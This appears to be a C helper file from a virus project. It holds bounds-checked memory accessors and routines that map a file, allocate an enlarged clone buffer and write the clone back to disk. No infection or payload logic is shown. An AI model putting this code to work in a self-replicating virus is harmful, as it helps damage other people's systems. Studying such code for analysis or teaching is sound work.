#include <sys/mman.h>
#include <sys/stat.h>
#include "accessors.h"
#include "virus_header.h"
#include "syscalls.h"
#include "compiler_utils.h"
#include "errors.h"

/*
** safe()
** returns a safe pointer
** returns NULL if requested memory is out of range
*/
__warn_unused_result
void	*safe(struct safe_ptr ref, size_t offset, size_t size)
{
	if (offset + size > ref.size || offset + size < offset)
		return NULL;

	return (ref.ptr + offset);
}

bool	free_accessor(struct safe_ptr *ref)
{
	if (ref->ptr != NULL)
	{
		if (sys_munmap(ref->ptr, ref->size) != 0)
			return errors(ERR_SYS, _ERR_S_MUNMAP, _ERR_T_FREE_ACCESSOR);
	}
	return true;
}

__warn_unused_result
bool	init_file_safe(struct safe_ptr *ref, const char *file)
{
	void		*ptr;
	struct stat	buf;
	int		fd = sys_open(file, O_RDONLY);

	if (fd < 0)
		return errors(ERR_SYS, _ERR_S_OPEN, _ERR_T_INIT_FILE_SAFE);
	if (sys_fstat(fd, &buf) < 0)
		{sys_close(fd); return errors(ERR_SYS, _ERR_S_FSTAT, _ERR_T_INIT_FILE_SAFE);}
	if (buf.st_mode & S_IFDIR)
		{sys_close(fd); return errors(ERR_USAGE, _ERR_U_NOT_FILE, _ERR_T_INIT_FILE_SAFE);}
	if ((ssize_t)(ptr = sys_mmap(0, buf.st_size, PROT_READ, MAP_PRIVATE, fd, 0)) < 0)
		{sys_close(fd); return errors(ERR_SYS, _ERR_S_MMAP, _ERR_T_INIT_FILE_SAFE);}
	if (sys_close(fd))
		return errors(ERR_SYS, _ERR_S_CLOSE, _ERR_T_INIT_FILE_SAFE);

	ref->ptr  = ptr;
	ref->size = buf.st_size;
	return true;
}

__warn_unused_result
bool	init_clone_safe(struct safe_ptr *ref, size_t file_size, size_t extra_size)
{
	ref->size = file_size + extra_size;
	ref->ptr = sys_mmap(0, ref->size,
		PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

	if ((ssize_t)ref->ptr < 0)
		return errors(ERR_SYS, _ERR_S_MMAP, _ERR_T_INIT_CLONE_SAFE);

	return true;
}

__warn_unused_result
bool	write_file(struct safe_ptr ref, size_t size, const char *file)
{
	void	*ptr = safe(ref, 0, size);

	if (ptr == NULL)
		return errors(ERR_FILE, _ERR_F_READ_CLONE, _ERR_T_WRITE_FILE);

	int	fd = sys_open(file, O_CREAT | O_WRONLY | O_TRUNC, S_IRWXU);

	if (fd < 0)
		return errors(ERR_SYS, _ERR_S_OPEN, _ERR_T_WRITE_FILE);

	if (sys_write(fd, ptr, size) < 0)
	{
		sys_close(fd);
		return errors(ERR_SYS, _ERR_S_CLOSE, _ERR_T_WRITE_FILE);
	}
	sys_close(fd);
	return true;
}
